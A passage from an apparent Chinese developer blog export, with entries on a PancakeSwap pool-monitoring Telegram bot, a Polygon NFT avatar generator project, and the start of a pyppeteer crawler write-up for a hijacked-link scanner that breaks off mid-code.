<p>以上两种方法,我都实现了,实际暂用的是第一种方法</p>
</blockquote>
<h2 id="计算ROI投资回报率">计算ROI投资回报率:</h2>
<p><code>每日/周/月/年对应的usd收益</code>计算思路:</p>
<ol>
<li class="lvl-3">
<p><code>一天下来BSC约出多少个区块？</code><br />
一天24<em>60</em>60=86400秒, 除以3 等于 28800 块，一天可以出28800块</p>
</li>
<li class="lvl-3">
<p><code>糖浆池一天产出的奖励代币值多少u?</code><br />
<code>每区块奖励代币数量 X 代币价格 X 一天区块数</code><br />
例子：rewardPerBlock每区块奖励 4.34(Ether),每区块共可以挖出4.34个PEEL<br />
PEEL单价是0.1582美元，每区块可以产出0.686588美元<br />
一天可以产出多少U?   一天区块数*每区块的u产出=19773.7344美元</p>
</li>
<li class="lvl-3">
<p><code>你质押的cake占池子总cake的比例是多少?</code><br />
总cake:9485879 ,你质押的100个cake<br />
比例： 100/100+9485879 = ≈ 0.00001054<br />
比例 * 一天产出总u = 0.20845223 U</p>
</li>
</ol>
<p>总结一下，<code>每日的usd收益</code>计算公式为: <code>每区块奖励代币数量 X 代币价格 X 一天区块数 X 你质押占池子的比例</code></p>
<h2 id="生成饼状图和表格图">生成饼状图和表格图:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用<a href="https://github.com/go-echarts/go-echarts">go-echarts</a>生成html文件</p>
</li>
<li class="lvl-2">
<p>本地启动一个简单的http服务器,能够访问生成的html文件</p>
</li>
<li class="lvl-2">
<p>本地启用<a href="https://github.com/lampnick/doctron">doctron</a>服务：html转为图片</p>
</li>
</ul>
<p><code>go mod tidy</code>安装<code>go-echarts</code>时,会出现安装错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">github.com/go-echarts/go-echarts/v2 v2.2.5-0.20211021024243-33ae1aa415d6 </span><br></pre></td></tr></table></figure>
<p>运行/是用<code>doctron</code>时,可能会出现的问题:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定config文件、</span></span><br><span class="line">go run main.go --config <span class="string">&quot;/github/doctron/conf/default.yaml&quot;</span></span><br><span class="line"><span class="comment"># 简单html转成图片</span></span><br><span class="line">http://199.255.96.224:8080/convert/html2image?u=doctron&amp;p=lampnick&amp;url=http://127.0.0.1:9090/table.html</span><br><span class="line"><span class="comment"># 裁剪图片</span></span><br><span class="line">http://127.0.0.1:8080/convert/html2image?u=doctron&amp;p=lampnick&amp;url=http://199.255.96.224:9090/bar.html&amp;customClip=<span class="literal">true</span>&amp;clipX=0&amp;clipY=0&amp;clipWidth=400&amp;clipHeight=1500&amp;clipScale=2&amp;format=jpeg&amp;Quality=80  </span><br></pre></td></tr></table></figure>
<p>效果图:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220826162056.png" alt="20220826162056" /><br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220826162107.png" alt="20220826162107" /></p>
<h2 id="生成GoAbi文件">生成GoAbi文件:</h2>
<p>然后将<code>interface</code>智能合约编译为<code>JSON ABI</code>，并使用<code>abigen</code>从<code>ABI</code>创建Go包。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">solc --abi erc20.sol</span><br><span class="line">abigen --abi=erc20_sol_ERC20.abi --pkg=token --out=erc20.go</span><br><span class="line">abigen --abi=erc20_sol_ERC20.abi --pkg=erc20 --out=erc20.go</span><br><span class="line"><span class="comment"># 基于json</span></span><br><span class="line"><span class="comment"># pkg 指定输出文件的包名,也就是package名称</span></span><br><span class="line"><span class="comment"># type 指定合约结构体名称</span></span><br><span class="line"><span class="comment"># out 指定输出go文件名称</span></span><br><span class="line">abigen --abi=pancakeRouter.json --pkg=pancakeRouter --<span class="built_in">type</span>=pancakeRouter --out=pancakeRouter.go</span><br></pre></td></tr></table></figure>
<p>基于json的话，就方便一些，不用自己再<code>solc</code>编译，直接从区块链浏览器copy abi的json数据下来，再生成go文件。</p>
<h2 id="清除TgBot的自定义键盘">清除TgBot的自定义键盘:</h2>
<p>参考<a href="https://stackoverflow.com/questions/72071211/how-to-remove-a-button-from-the-telebot-keyboard">How to remove a button from the telebot keyboard?</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用库PyTelegramBotAPI</span></span><br><span class="line"><span class="keyword">import</span> telebot</span><br><span class="line"><span class="keyword">from</span> telebot <span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">from</span> telebot.types <span class="keyword">import</span> ReplyKeyboardRemove</span><br><span class="line"></span><br><span class="line">TOKEN = <span class="string">&quot;&quot;</span></span><br><span class="line">bot = telebot.TeleBot(TOKEN)</span><br><span class="line"></span><br><span class="line"><span class="meta">@bot.message_handler(<span class="params">commands=[<span class="string">&#x27;start&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_welcome</span>(<span class="params">message</span>):</span><br><span class="line">    bot.send_message(message.from_user.<span class="built_in">id</span>, <span class="string">&quot;Done with Keyboard&quot;</span>, reply_markup=ReplyKeyboardRemove())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bot.polling()</span><br></pre></td></tr></table></figure>
<h2 id="DexGuruApi">DexGuruApi:</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># api endpoint</span></span><br><span class="line">https://api.dex.guru/v3/tokens</span><br><span class="line">Request Method: POST</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;ids&quot;</span>:[<span class="string">&quot;0xe5ba47fd94cb645ba4119222e34fb33f59c7cd90-bsc&quot;</span>],<span class="string">&quot;network&quot;</span>:<span class="string">&quot;eth,optimism,bsc,polygon,fantom,arbitrum,celo,avalanche&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p><code>postman</code>测试后可直接调用,没有什么validate的限制</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220830112305.png" alt="20220830112305" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解析一下字段,看看哪些是我需要的</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;total&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;data&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;marketType&quot;</span>: <span class="string">&quot;token&quot;</span>,</span><br><span class="line">            <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0xe5ba47fd94cb645ba4119222e34fb33f59c7cd90&quot;</span>, <span class="comment"># erc20合约地址</span></span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;0xe5ba47fd94cb645ba4119222e34fb33f59c7cd90-bsc&quot;</span>,</span><br><span class="line">            <span class="string">&quot;symbols&quot;</span>: [ <span class="comment"># 符号</span></span><br><span class="line">                <span class="string">&quot;SAFUU&quot;</span> </span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;underlyingAddresses&quot;</span>: null,</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;SAFUU&quot;</span>, <span class="comment"># 代币名称</span></span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Safuu/SAFUU&quot;</span>,</span><br><span class="line">            <span class="string">&quot;txns24h&quot;</span>: <span class="number">1435</span>, <span class="comment">#  买卖交易数量</span></span><br><span class="line">            <span class="string">&quot;txns24hChange&quot;</span>: -<span class="number">0.02711864406779661</span>, <span class="comment">#  买卖交易数量日变化量</span></span><br><span class="line">            <span class="string">&quot;verified&quot;</span>: true, <span class="comment"># 应该是合约已在浏览器上开源</span></span><br><span class="line">            <span class="string">&quot;decimals&quot;</span>: <span class="number">5</span>, <span class="comment"># 小数位</span></span><br><span class="line">            <span class="string">&quot;volume24h&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;volume24hUSD&quot;</span>: <span class="number">492295.9654380776</span>, <span class="comment"># 24小时交易额 usd</span></span><br><span class="line">            <span class="string">&quot;volume24hETH&quot;</span>: <span class="number">1757.114873768033</span>,</span><br><span class="line">            <span class="string">&quot;liquidityUSD&quot;</span>: <span class="number">4879945.6020368</span>, <span class="comment"># 流动性总值usd</span></span><br><span class="line">            <span class="string">&quot;liquidityETH&quot;</span>: <span class="number">17075.770014168</span>,</span><br><span class="line">            <span class="string">&quot;priceUSD&quot;</span>: <span class="number">4.708795540046774</span>, <span class="comment"># 价格usd</span></span><br><span class="line">            <span class="string">&quot;priceETH&quot;</span>: <span class="number">0.016476886474312287</span>,</span><br><span class="line">            <span class="string">&quot;priceUSDChange24h&quot;</span>: -<span class="number">0.04544822975053079</span>, <span class="comment"># 24小时/日价格变化百分比，实际使用保留2位小数即可</span></span><br><span class="line">            <span class="string">&quot;priceETHChange24h&quot;</span>: -<span class="number">0.06579597999452005</span>,</span><br><span class="line">            <span class="string">&quot;timestamp&quot;</span>: <span class="number">1646175168</span>,</span><br><span class="line">            <span class="string">&quot;blockNumber&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;AMM&quot;</span>: <span class="string">&quot;uniswap&quot;</span>,</span><br><span class="line">            <span class="string">&quot;network&quot;</span>: <span class="string">&quot;bsc&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tokenListsNames&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;CoinGecko&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&quot;marketCap&quot;</span>: <span class="number">92327128.84538096</span>, <span class="comment"># 市值</span></span><br><span class="line">            <span class="string">&quot;marketCapChange24h&quot;</span>: -<span class="number">3.4174444324253552</span>,</span><br><span class="line">            <span class="string">&quot;liquidityUSDChange24h&quot;</span>: -<span class="number">0.001405521715464049</span>,</span><br><span class="line">            <span class="string">&quot;liquidityETHChange24h&quot;</span>: -<span class="number">0.022692110533886735</span>,</span><br><span class="line">            <span class="string">&quot;volumeUSDChange24h&quot;</span>: -<span class="number">0.4209862961472752</span>, <span class="comment"># 日交易额变化量</span></span><br><span class="line">            <span class="string">&quot;volumeETHChange24h&quot;</span>: -<span class="number">0.42125377954269494</span>,</span><br><span class="line">            <span class="string">&quot;logoURI&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;https://assets.dex.guru/icons/0xe5ba47fd94cb645ba4119222e34fb33f59c7cd90-bsc.jpg&quot;</span></span><br><span class="line">            ] <span class="comment"># logo资源文件</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="暂未解决的Bug">暂未解决的Bug:</h2>
<p>提示新池子出现了Bug：<br />
新池子的配置文件<code>pools.tsx</code>下午就更新了,但新糖浆池实际上开始的时间在晚上，<br />
然后TgBot下午就触发了新池提醒，但实际上池子还没有正式上线,在<code>pancake swap</code>的前端页面也没有显示出来。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220826164612.png" alt="20220826164612" /><br />
也会导致日收益饼状图计算比例失真：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220826164921.png" alt="20220826164921" /></p>
<p>糖浆池正式开始的标志：开始区块转换为utc+8时间 or 总质押cake数量不为0</p>
<blockquote>
<p>好奇?会有机器人在区块刚开始的后几个区块就质押进去吗?gas消耗情况？</p>
</blockquote>
<h1>Inspire:</h1>
<ol>
<li class="lvl-3">
<p>监测新糖浆池信息,质押u借出cake,冲新池白嫖bonus奖励,挖提卖成u,bonus期结束,归还cake</p>
</li>
<li class="lvl-3">
<p>Base Binance交易所的稳定币APR 10%,尝试自己能否开发出接近的理财工具/策略(低风险,较好的收益)</p>
</li>
<li class="lvl-3">
<p>数据可视化值得多尝试</p>
</li>
</ol>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.ohyee.cc/post/note_go_js">在 Go 中运行 JS 代码</a></p>
</li>
<li class="lvl-2">
<p><a href="https://goethereumbook.org/zh/smart-contract-read-erc20/">查询ERC20代币智能合约</a></p>
</li>
<li class="lvl-2">
<p><a href="https://goethereumbook.org/zh/">用Go来做以太坊开发</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/qq_41661056/article/details/124195284">安装abigen，以太坊合约转go代码及调用合约</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/081d97f57995">Golang注释规范</a></p>
</li>
<li class="lvl-2">
<p><a href="http://www.wjhsh.net/K-artorias-p-8873365.html">golang string转json的一些坑</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/qq_42057154/article/details/123739565">Badger简单使用</a></p>
</li>
<li class="lvl-2">
<p><a href="http://liuqh.icu/2020/12/19/go/basic/20-http/">Go学习(二十):Web开发-HTTP服务端启动的几种方式</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/lampnick/doctron/blob/master/README_ZH.md#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%A4%A7%E5%B0%8F-1">doctron_html转img</a></p>
</li>
<li class="lvl-2">
<p><a href="https://juejin.cn/post/6844903891344048141">细说Golang的JSON解析</a></p>
</li>
<li class="lvl-2">
<p><a href="https://cloud.tencent.com/developer/article/1610531">学会用Go解析复杂JSON的思路</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/liuyuncd/article/details/106900453">golang爬虫colly 发送post请求</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-开源头像拼图网站-CryptoYoungNFT开发记录</title>
    <url>/2022/52013.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>看到<a href="https://0xmonkey.fullstack.run/89cf4c91-510b5ed-e14fcc8e-b1f1a176-0-0-0-b1425ffb">0xmonkey开源头像拼图</a>，觉得还不错，模仿一个。</p>
<h1>效果图：</h1>
<h2 id="开源头像拼图网站">开源头像拼图网站:</h2>
<p><a href="http://199.255.96.224:3000/">Avatar Generator Website</a>:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220703202943.png" alt="20220703202943" /></p>
<h2 id="Opensea">Opensea:</h2>
<p><a href="https://opensea.io/collection/cryptoyoung-v2">Opensea</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220704005920.png" alt="20220704005920" /><br />
<a href="https://polygonscan.com/address/0xc1e8efe8d62b855c34009013a8d354d093f3e7f1#writeContract">Free mint on Polygon Now</a></p>
<h1>素材:</h1>
<h2 id="下载token图标：">下载token图标：</h2>
<p><a href="https://coinmarketcap.com/">图片来源</a>:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220721093455.png" alt="20220721093455" /></p>
<p>下载top10的token的图标,用来做眼睛的素材</p>
<h2 id="procreate编辑">procreate编辑:</h2>
<p>将图标插入ipad里的<code>procreate</code>中进行编辑</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220721093653.png" alt="20220721093653" /></p>
<p>编辑完，导出图层png到mac</p>
<h2 id="png-svg">png-&gt;svg:</h2>
<p>通过在线网站将<code>png</code>格式的图片转换成<code>svg</code>格式</p>
<blockquote>
<p>SVG 是一种基于 XML 语法的图像格式，全称是可缩放矢量图（Scalable Vector Graphics）。其他图像格式都是基于像素处理的，SVG 则是属于对图像的形状描述，所以它本质上是文本文件，体积较小，且不管放大多少倍都不会失真。</p>
</blockquote>
<p>最后再编辑一下<code>svg</code>文件里眼睛素材的坐标，使得眼睛素材位置对得上</p>
<h1>前端:</h1>
<p>基于<a href="https://github.com/Codennnn/vue-color-avatar">vue-color-avatar</a>前端框架。</p>
<p>修改素材:</p>
<p><code>src/components/Configurator.vue</code>控制选择素材的控件</p>
<p>前端右边选择栏：可选插件里加入<code>/src/assets/widgets/eyes/new.svg</code></p>
<p><code>src/enums/index.ts</code>做相应配置、<code>src/utils/dynamic-data.ts</code>做相应配置</p>
<h1>工具脚本：</h1>
<p>用脚本批量生成图片：</p>
<ol>
<li class="lvl-3">
<p>前端代码生成</p>
</li>
<li class="lvl-3">
<p>selenium生成 √</p>
</li>
</ol>
<p>自动生成描述文件：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220721094941.png" alt="20220721094941" /><br />
处理成 符合格式的描述文件<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220721094958.png" alt="20220721094958" /></p>
<p>再自动下载图片，按递增的序号命名一下，使得描述文件和图片一一匹配。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220721095131.png" alt="20220721095131" /></p>
<h1>合约：</h1>
<h2 id="deploy">deploy:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    string memory _initURI,</span></span><br><span class="line"><span class="params">    uint256 _maxBatchSize,</span></span><br><span class="line"><span class="params">    uint256 _collectionSize,</span></span><br><span class="line"><span class="params">    uint256 _maxreserveAmount</span></span><br><span class="line"><span class="params"></span>)</span><br><span class="line"><span class="title class_">ERC721A</span>(<span class="string">&quot;CryptoYoung&quot;</span>, <span class="string">&quot;CryptoYoung&quot;</span>, _maxBatchSize, _collectionSize)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable constant_">MAX_MINT</span> = _maxBatchSize;</span><br><span class="line">    <span class="variable constant_">MAX_SUPPLY</span> = _collectionSize;</span><br><span class="line">    maxreserveAmount = _maxreserveAmount;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">setBaseURI</span>(_initURI);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>部署合约时，设置好构造函数的参数:</p>
<p>设置<code>name_</code>和<code>symbol_</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">ERC721A</span>(<span class="string">&quot;CryptoYoung&quot;</span>, <span class="string">&quot;CryptoYoung&quot;</span>...)</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>string memory _initURI</code>(资源所在文件夹路径) :  “<a href="https://raw.githubusercontent.com/jerrychan807/crypto-young-nft/main/resource/">https://raw.githubusercontent.com/jerrychan807/crypto-young-nft/main/resource/</a>”</p>
</li>
<li class="lvl-2">
<p><code>uint256 _maxBatchSize</code> (一次最多可mint多少个): 2</p>
</li>
<li class="lvl-2">
<p><code>uint256 _collectionSize</code>(总供应量) : 1000</p>
</li>
<li class="lvl-2">
<p><code>uint256 _maxreserveAmount</code>(应该是预留量) : 100</p>
</li>
</ul>
<p>polygon主网合约地址:<a href="https://polygonscan.com/address/0xc1e8efe8d62b855c34009013a8d354d093f3e7f1">https://polygonscan.com/address/0xc1e8efe8d62b855c34009013a8d354d093f3e7f1</a></p>
<h2 id="验证源码">验证源码:</h2>
<p>直接用hardhat插件验证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn hardhat verify --contract contracts/CryptoYoung.sol:CryptoYoung --constructor-args arguments.ts --network polygon <span class="variable">$YourContractAddress</span></span><br></pre></td></tr></table></figure>
<h2 id="开始mint">开始mint:</h2>
<p>合约所有者通过调用合约，<code>Set Status(1)</code>，打开mint开关</p>
<p>然后用户就可以free mint了</p>
<h2 id="合约导入opensea">合约导入opensea:</h2>
<p>合约导入opensea:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>测试网: <code>https://testnets.opensea.io/get-listed/step-two</code></p>
</li>
<li class="lvl-2">
<p>主网: <code>https://opensea.io/get-listed/step-two</code></p>
</li>
</ul>
<p>然后就可以在<code>opensea</code>,看到mint后的对应图片了。如果图片没正常展示，可点击刷新图片的按钮。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220721100358.png" alt="20220721100358" /></p>
<h1>Todo List:</h1>
<p>素材：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox5" checked="true" /><label for="checkbox5">生成10张图和对应的json描述文件</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox6" checked="true" /><label for="checkbox6">token img svg化</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox7" checked="true" /><label for="checkbox7">删掉原有的眼睛元素、不开心的嘴巴/眉毛素材</label></p>
</li>
</ul>
<p>前端:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox8" checked="true" /><label for="checkbox8">前端能外网访问</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox9" checked="true" /><label for="checkbox9">修改前端的一些展示信息</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox10" checked="true" /><label for="checkbox10">图片管理应该在本项目的github里</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox11" /><label for="checkbox11">素材preview展示太小了</label></p>
</li>
</ul>
<p>合约:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox12" checked="true" /><label for="checkbox12">合约测试网，试一试</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox13" checked="true" /><label for="checkbox13">合约的一些关键参数</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox14" checked="true" /><label for="checkbox14">发布：先上传图片和资源  不要有空白眼睛</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox15" checked="true" /><label for="checkbox15">polygon搞一个开发者账户</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox16" checked="true" /><label for="checkbox16">发布合约到polygon</label></p>
</li>
</ul>
<p>opensea:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox17" checked="true" /><label for="checkbox17">导入合约到opensea</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox18" checked="true" /><label for="checkbox18">编辑项目描述信息</label></p>
</li>
</ul>
<p>github:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><input type="checkbox" id="checkbox19" checked="true" /><label for="checkbox19">readme</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox20" checked="true" /><label for="checkbox20">开源代码</label></p>
</li>
<li class="lvl-2">
<p><input type="checkbox" id="checkbox21" checked="true" /><label for="checkbox21">Blog 开发记录</label></p>
</li>
</ul>
<h1>Summary:</h1>
<p><a href="https://mp.weixin.qq.com/s/ZlpnoFFfs5Vmvjwz_mjo-g">买 NFT，实际是在买什么？从底层代码视角的分析</a></p>
<blockquote>
<p>我们所说的 NFT ，说到底是一个以太坊的地址上的一个支持 NFT 协议（也就是 ERC721）的智能合约，它支持 tokenURI 等十几个标准函数。</p>
<p>给定一个 Tokend 的 ID，它可以告诉你一个区块链以外的地址，这个地址里面给出了图像，名称等等信息。</p>
<p><strong>我们购买一个 NFT，说到底是购买了某个合约地址里面的某个 TokenID</strong></p>
<p>或者说，就是在那张大大的表上，这个合约地址上的那个 tokenID 这一行的 owner 属性，记录自己的钱包地址。<br />
<strong>除此以外的信息，包括上面这张猴子的头像，其实仅仅如包装纸上的图案一样，仅仅是一个赠品</strong>。</p>
</blockquote>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.ruanyifeng.com/blog/2018/08/svg.html">SVG 图像入门教程</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.tailorbrands.com/newlogo">logo生成</a></p>
</li>
<li class="lvl-2">
<p><a href="https://tokenizedhq.com/content-not-available-yet-opensea/">Solved: How to Fix Content Not Available Yet OpenSea Error</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/Codennnn/vue-color-avatar">vue-color-avatar</a></p>
</li>
<li class="lvl-2">
<p><a href="https://0xmonkey.fullstack.run/89cf4c91-510b5ed-e14fcc8e-b1f1a176-0-0-0-b1425ffb">0xmonkey开源头像拼图</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.aconvert.com/cn/image/png-to-svg/">PNG转SVG - 在线转换图像文件</a></p>
</li>
<li class="lvl-2">
<p><a href="https://photokit.com/editor/?lang=zh#goog_rewarded">图片圆角编辑</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>Pyppeteer-浏览器爬虫初探</title>
    <url>/2019/44791.html</url>
    <content><![CDATA[<h1>pre:</h1>
<p>最近打算捣鼓一个黑链扫描器.</p>
<p>当你打开浏览器去访问被挂了黑链的网站的时候,渲染执行完js代码后,就会跳转到恶意的网站.</p>
<p>那么这种情况应该选用什么爬虫的解决方案呢?即技术选型</p>
<hr />
<h1>技术选型:</h1>
<h2 id="方案一-静态爬虫">方案一 静态爬虫:</h2>
<p>在python中最常见的就是用<code>requests</code>,<code>urllib2</code>等库来模拟发包,执行简单的HTTP请求并获取HTML页面.</p>
<p>这种方案比较适合于对特定网站进行简单的爬取,优点是:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>在CPU和内存消耗方面的开销很低</p>
</li>
<li class="lvl-2">
<p>开发速度快</p>
</li>
</ul>
<p>但是缺点也很明显:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>不通用:发包情况千千万,都要模拟请求的话不现实</p>
</li>
<li class="lvl-2">
<p>无法收集通过JavaScript动态生成的内容</p>
</li>
</ul>
<p>基于以上两点,果断弃之.</p>
<hr />
<h2 id="方案二-动态爬虫">方案二 动态爬虫:</h2>
<p>选型1: 使用<code>Selenium</code>等库来驱动Chrome、Firefox或PhantomJS.</p>
<blockquote>
<p>在Chrome的Headless模式刚出现不久，我们当时就调研过用作漏洞扫描器爬虫的需求，但由于当时功能不够完善，以及无法达到稳定可靠的要求。举个例子，对于网络请求，无法区分导航请求和其它请求，而本身又不提供navigation lock的功能，所以很难确保页面的处理不被意外跳转中断。同时，不太稳定的CDP经常意外中断和产生Chrome僵尸进程，所以我们之前一直在使用PhantomJS。</p>
<p>但随着前端的框架使用越来越多，网页内容对爬虫越来越不友好，在不考虑进行服务端渲染的情况下，Vue等框架让静态爬虫彻底失效。同时，由于JS的ES6语法的广泛使用，缺乏维护（创始人宣布归档项目暂停开发）的PhantomJS开始变的力不从心。</p>
<p>----<a href="https://www.anquanke.com/post/id/178339">漏扫动态爬虫实践</a></p>
</blockquote>
<p>选型2: <code>pyppeteer</code>+<code>Chromium headless</code></p>
<blockquote>
<p>在去年，puppeteer和Chromium项目在经历了不断迭代后，新增了一些关键功能，Headless模式现在已经能大致胜任扫描器爬虫的任务。</p>
<p>所以我们在去年果断更新了扫描器的动态爬虫，采用Chromium的Headless模式作为网页内容解析引擎<br />
----<a href="https://www.anquanke.com/post/id/178339">漏扫动态爬虫实践</a></p>
</blockquote>
<hr />
<h2 id="总结-4">总结:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>Chrome</code>的Headless模式早期不成熟</p>
</li>
<li class="lvl-2">
<p><code>PhantomJS</code>不再维护了</p>
</li>
<li class="lvl-2">
<p><code>puppeteer</code>和<code>Chromium</code>项目在不断迭代更新</p>
</li>
</ul>
<p>综上,就决定使用<code>pyppeteer</code>+<code>Chromium headless</code>这个搭配方案了.</p>
<p>那么,现在就跑个Demo来试试水.(参考<a href="https://medium.com/z1digitalstudio/pyppeteer-the-snake-charmer-f3d1843ddb19">Pyppeteer, the snake charmer</a>)</p>
<hr />
<h1>Demo:</h1>
<blockquote>
<p>原文章里的代码基本可以运行.<br />
就是<code>url</code>和需要提取信息的<code>xpath</code>发送了一些变化.稍作修改即可</p>
</blockquote>
<hr />
<h2 id="静态爬虫">静态爬虫:</h2>
<p>先用最原始的方式,确认能够获取得到信息.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/5/18 11:32 PM</span></span><br><span class="line"><span class="comment"># @Author  : Jerry</span></span><br><span class="line"><span class="comment"># @Desc    : </span></span><br><span class="line"><span class="comment"># @File    : pyppeteer1.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"><span class="keyword">import</span> lxml.html</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">return</span> request.urlopen(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_document</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">return</span> response.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_data</span>(<span class="params">document</span>):</span><br><span class="line">    <span class="comment"># Generate document tree</span></span><br><span class="line">    tree = lxml.html.fromstring(document)</span><br><span class="line">    <span class="comment"># Select tr with a th and td descendant from table</span></span><br><span class="line">    elements = tree.xpath(<span class="string">&#x27;//*[@id=&quot;mw-content-text&quot;]/div/table[1]/tbody/tr[th and td]&#x27;</span>)</span><br><span class="line">    <span class="comment"># Extract data</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">        th, td = element.iterchildren()</span><br><span class="line">        result.update(&#123;</span><br><span class="line">            th.text_content(): td.text_content()</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 